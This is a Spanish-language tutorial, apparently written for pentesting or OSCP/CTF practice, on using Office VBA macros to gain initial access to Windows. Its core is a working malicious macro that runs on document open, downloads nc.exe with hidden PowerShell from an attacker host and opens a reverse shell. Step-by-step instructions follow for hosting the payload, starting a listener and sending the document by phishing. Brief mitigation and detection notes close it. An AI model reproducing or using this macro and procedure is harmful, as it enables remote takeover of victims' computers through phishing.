### ¿Qué es una macro?

Una **macro** es una secuencia de comandos o instrucciones automatizadas que pueden ejecutarse dentro de aplicaciones como **Microsoft Office (Word, Excel, PowerPoint, etc.)**. Estas macros se escriben en **VBA (Visual Basic for Applications)** y se utilizan para automatizar tareas repetitivas.

----------

### Uso de macros como vector de ataque en Windows

Los atacantes pueden **abusar de las macros** para ejecutar código malicioso en un sistema Windows, generalmente con el objetivo de obtener acceso inicial o ejecutar malware.

#### **1. Métodos de ataque con macros**

##### **a) Documento de Office malicioso**

-   Se crea un documento (ej. `factura.docm`, `reporte.xlsm`) con una macro VBA maliciosa.
-   Se envía a la víctima por **phishing** o ingeniería social.
-   La macro se ejecuta cuando la víctima **habilita macros** en Office.

##### **b) Descarga y ejecución de payloads**

-   Una macro maliciosa puede descargar y ejecutar un archivo desde Internet (`certutil.exe`, `mshta.exe`, `powershell.exe`).
-   Ejemplo de código VBA que descarga un payload:

```
Sub AutoOpen()
   Dim objShell As Object
   Set objShell = CreateObject("WScript.Shell")
   objShell.Run "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command Invoke-WebRequest -Uri http://attacker.com/nc.exe -OutFile C:\Windows\Temp\nc.exe"
   objShell.Run "C:\Windows\Temp\nc.exe -e cmd.exe attacker_ip 4444"
End Sub
```
-   **Objetivo:** descargar y ejecutar `nc.exe` para obtener una **reverse shell**.

##### **c) Persistence con macros en Plantillas Globales**

-   Se coloca una macro maliciosa en la **plantilla global de Word (`Normal.dotm`)**.
-   Cada vez que la víctima abre Word, la macro se ejecuta automáticamente.

##### **d) Uso de Macros para Evasión de Seguridad**

-   Técnicas como **obfuscación**, `Application.Run`, `Shell`, `WScript.Shell` evitan detección por antivirus.
-   Uso de **DDE (Dynamic Data Exchange)** en lugar de macros para ejecutar comandos.

----------

### **Protecciones y mitigaciones**

1.  **Deshabilitar macros** por defecto en Microsoft Office.
2.  **Habilitar Protected View** para evitar la ejecución automática.
3.  **Bloquear ejecución de VBA en documentos descargados** con políticas de grupo (`GPO`).
4.  **Monitorizar procesos anómalos** (`winword.exe` ejecutando `cmd.exe` o `powershell.exe`).
5.  **Uso de firmas y control de aplicaciones** con AppLocker o WDAC.

----------

### **Casos Reales y Uso en Red Team**

-   **Emotet** y **TrickBot** usaron macros para descargar ransomware.
-   **Cobalt Strike** usa macros para implantar payloads en pentesting.
-   En pruebas OSCP y CTFs, las macros pueden ser utilizadas para ejecutar `msfvenom` payloads en máquinas Windows.

----------
**ejemplo funcional** de una macro VBA que puedes usar en un entorno controlado para pruebas. Este código descarga y ejecuta `nc.exe` para abrir una **reverse shell** en Windows.

> ⚠ **Advertencia**: Usa este código **solo en entornos de prueba y con autorización**. No me hago responsable del uso indebido.

----------

## **1️⃣ Crear un Documento de Office con Macro Maliciosa**

Este código en VBA se ejecutará cuando se abra el documento.

```
Sub AutoOpen()
    Call Payload
End Sub

Sub Document_Open()
    Call Payload
End Sub

Sub Payload()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    ' Descargar Netcat desde un servidor
    objShell.Run "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command Invoke-WebRequest -Uri http://ATTACKER_IP/nc.exe -OutFile C:\Windows\Temp\nc.exe", 0, True
    
    ' Ejecutar Netcat para obtener una reverse shell
    objShell.Run "C:\Windows\Temp\nc.exe -e cmd.exe ATTACKER_IP 4444", 0, False
End Sub
```
## **2️⃣ Explicación del Código**

-   `AutoOpen()` y `Document_Open()` → Se ejecutan automáticamente cuando el documento se abre.
-   `Payload()`:
    -   Descarga `nc.exe` desde un servidor con `Invoke-WebRequest`.
    -   Guarda `nc.exe` en `C:\Windows\Temp\`.
    -   Ejecuta `nc.exe` para enviar una **reverse shell** a tu máquina atacante (`ATTACKER_IP:4444`).

----------

## **3️⃣ Cómo Usarlo**

### **📌 Paso 1: Configurar el Servidor Python**

1.  **Descargar Netcat para Windows (`nc.exe`)**  
    En tu máquina atacante (Kali Linux), descarga `nc64.exe` (versión de netcat para Windows):

`wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc.exe`

2. Iniciar un servidor HTTP para servir `nc.exe`

`python3 -m http.server 80`

Esto permitirá que la víctima descargue `nc.exe`.

### **📌 Paso 2: Modificar la Macro**

-   Cambia **`ATTACKER_IP`** en el código VBA por la IP de tu máquina atacante.
-   Guarda el código en un documento **Word o Excel habilitado para macros** (`.docm` o `.xlsm`).

----------

### **📌 Paso 3: Iniciar el Listener en Kali**

Antes de que la víctima abra el documento, inicia un **listener** en tu Kali:

`nc -lvnp 4444`

### **📌 Paso 4: Enviar el Documento**

-   Envíalo mediante phishing o ingeniería social (en un CTF, súbelo al sistema objetivo si hay un vector de carga).

----------

## **4️⃣ Defensa y Detección**

### **📌 Cómo Detectarlo**

-   **Monitorizar procesos**: `winword.exe` ejecutando `cmd.exe` o `powershell.exe`.
-   **Ver logs de Windows Defender** si detecta la macro maliciosa.
-   **Revisar tráfico de red** para detectar descargas sospechosas.
